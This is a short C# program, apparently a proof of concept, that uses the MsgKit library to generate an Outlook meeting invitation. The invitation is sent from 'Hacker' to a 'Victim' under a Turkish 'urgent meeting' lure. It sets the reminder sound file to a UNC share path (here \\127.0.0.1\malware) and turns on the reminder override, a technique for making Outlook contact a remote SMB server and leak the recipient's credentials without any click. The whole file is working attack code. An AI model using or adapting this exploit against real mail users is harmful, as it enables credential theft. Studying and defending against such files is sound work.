using MsgKit.Enums;
using MsgKit;
using System.Security.Principal;

namespace MsgKitTestTool
{
    static class AppointmentTest
    {
        public static void Main()
        {
            using (var appointment = new Appointment(
                new Sender("hacker@demo.com", "Hacker Okan"),
                new Representing("kurban@demo.com", "Kurban"),
                "Acil Toplantı!!"))
            {
                string userName = WindowsIdentity.GetCurrent().Name;

                appointment.Recipients.AddTo("hacker@demo.com", "Hacker Okan");
                appointment.Recipients.AddTo("kurban@demo.com", "Victim", objectType: MapiObjectType.MAPI_DISTLIST, displayType: RecipientRowDisplayType.DistributionList);
                appointment.Subject = "Acil toplantı!";
                appointment.Location = "Türkiye";
                appointment.MeetingStart = DateTime.Now.Date;
                appointment.MeetingEnd = DateTime.Now.Date.AddDays(1).Date;
                appointment.AllDay = true;
                appointment.BodyRtfCompressed = true;
                appointment.BodyText = "Acil toplantı!!";
                appointment.BodyHtml = "<html><head></head><body><b>Acil toplantı!!</b></body></html>";
                appointment.SentOn = DateTime.UtcNow;
                appointment.Importance = MessageImportance.IMPORTANCE_NORMAL;
                appointment.IconIndex = MessageIconIndex.UnsentMail;
                appointment.PidLidReminderFileParameter = @"\\127.0.0.1\malware";
                appointment.PidLidReminderOverride = true;
                appointment.Save(@"test.msg");
            }
        }
    }
}
